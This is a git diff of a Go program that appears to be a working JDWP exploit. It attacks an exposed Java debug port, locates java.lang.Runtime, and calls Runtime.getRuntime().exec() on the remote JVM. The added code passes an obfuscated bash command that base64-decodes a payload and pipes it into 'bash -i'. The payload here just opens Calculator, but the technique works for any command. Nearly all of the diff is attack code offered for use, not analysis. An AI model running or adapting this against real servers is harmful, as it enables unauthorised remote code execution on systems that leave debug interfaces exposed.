@@ -9,6 +9,7 @@ import (
 	"github.com/kpli0rn/jdwpgo/protocol/vm"
 	"log"
 	"net"
+	"strconv"
 )
 
 func getMethodByName(methods *vm.AllMethodsReply, name string) *vm.AllMethodsMethod {
@@ -20,13 +21,8 @@ func getMethodByName(methods *vm.AllMethodsReply, name string) *vm.AllMethodsMet
 	return nil
 }
 
-// 40640200000001010000000200000000000011770100000000000003e100006000028a03e80000000000000031
-// size: 50 针对这个进行解析，提取出来 1144
-// 000000070040640200000001010000000200000000000011440100000000000003d50000600002e415a80000000000000031
-// size: 54
-// 000000040040640200000001010000000200000000000011420100000000000003d30000600003dca6680000000000000031
 func parseEvent(buf []byte, eventId int32, idsize *vm.IDSizesReply) (int32, uint64) {
-	raw := buf[7:]
+	raw := buf[11:]
 	rId := int32(binary.BigEndian.Uint32(raw[6:10]))
 	if rId != eventId {
 		return 0, 0
@@ -34,10 +30,6 @@ func parseEvent(buf []byte, eventId int32, idsize *vm.IDSizesReply) (int32, uint
 	rawtId := raw[10 : 10+idsize.ObjectIDSize]
 	tId := binary.BigEndian.Uint64(rawtId)
 	return rId, tId
-}
-
-func runtimeExec() {
-
 }
 
 func main() {
@@ -70,14 +62,13 @@ func main() {
 		return
 	}
 	fmt.Printf("[+] idSizes = %v\n", idSizes)
-
 	var runtimeClas vm.AllClassClass
 	for _, clas := range allClasses.Classes {
 		if clas.Signature.String() == "Ljava/lang/Runtime;" {
 			runtimeClas = clas
 		}
 	}
-	log.Println(fmt.Sprintf("[+] Found Runtime class: id=%v", runtimeClas.ReferenceTypeID))
+	fmt.Println(fmt.Sprintf("[+] Found Runtime class: id=%v", runtimeClas.ReferenceTypeID))
 	methods, _ := debuggerCore.VMCommands().AllMethods(runtimeClas.ReferenceTypeID) // 10d9
 	getRuntimeMethod := getMethodByName(methods, "getRuntime")
 	if getRuntimeMethod == nil {
@@ -99,11 +90,7 @@ func main() {
 	fmt.Println(fmt.Sprintf("[+] Setting 'step into' event in thread: %v", threadID))
 	debuggerCore.VMCommands().Suspend()
 	reply, _ := debuggerCore.VMCommands().SendEventRequest(1, threadID)
-	fmt.Println(reply.RequestID)
 	debuggerCore.VMCommands().Resume()
-
-	//res, _ := s.ReadPacket()
-	//fmt.Println(res.String())
 
 	buf := make([]byte, 128)
 	var rId int32
@@ -112,13 +99,39 @@ func main() {
 	if num != 0 {
 		replyData := buf[:num]
 		rId, tId = parseEvent(replyData, reply.RequestID, idSizes)
-		fmt.Println(hex.EncodeToString(replyData))
+		//fmt.Println(hex.EncodeToString(replyData))
 	}
 	fmt.Println(fmt.Sprintf("[+] Received matching event from thread %v", tId))
-	fmt.Println(rId)
 	debuggerCore.VMCommands().ClearCommand(rId)
 
-	// 获取之后进行命令执行
-	runtimeExec()
+	// 命令执行
+	// Step 1 allocating string
+	createStringReply, _ := debuggerCore.VMCommands().CreateString("bash -c {echo,b3BlbiAtYSBDYWxjdWxhdG9y}|{base64,-d}|{bash,-i}")
+	if createStringReply == nil {
+		log.Fatalln("[-] Failed to allocate command")
+	}
+	cmdObjectID := createStringReply.StringObject.ObjectID
+	fmt.Println(fmt.Sprintf("[+] Command string object created id:%v", cmdObjectID))
+
+	// step 2 通过调用 getRuntime 来获取 Runtime 对象
+	invokeStaticMethodReply, _ := debuggerCore.VMCommands().InvokeStaticMethod(runtimeClas.ReferenceTypeID, tId, getRuntimeMethod.MethodID)
+	if invokeStaticMethodReply.ContextID == 0 {
+		return
+	}
+	fmt.Println(fmt.Sprintf("[+] Runtime.getRuntime() returned context id:%v", invokeStaticMethodReply.ContextID))
+
+	// step 3
+	// find exec method
+	execMethod := getMethodByName(methods, "exec")
+	if execMethod == nil {
+		return
+	}
+	fmt.Println(fmt.Sprintf("[+] found Runtime.exec(): id=%v\n", execMethod.MethodID))
+
+	cmdObjectIDHex := make([]byte, 8)
+	binary.BigEndian.PutUint64(cmdObjectIDHex, cmdObjectID)
+	argsIDHex := strconv.FormatInt(int64(invokeStaticMethodReply.Tag), 16) + hex.EncodeToString(cmdObjectIDHex)
+	argsID, _ := hex.DecodeString(argsIDHex)
+	debuggerCore.VMCommands().InvokeMethod(invokeStaticMethodReply.ContextID, tId, runtimeClas.ReferenceTypeID, execMethod.MethodID, argsID)
 
 }
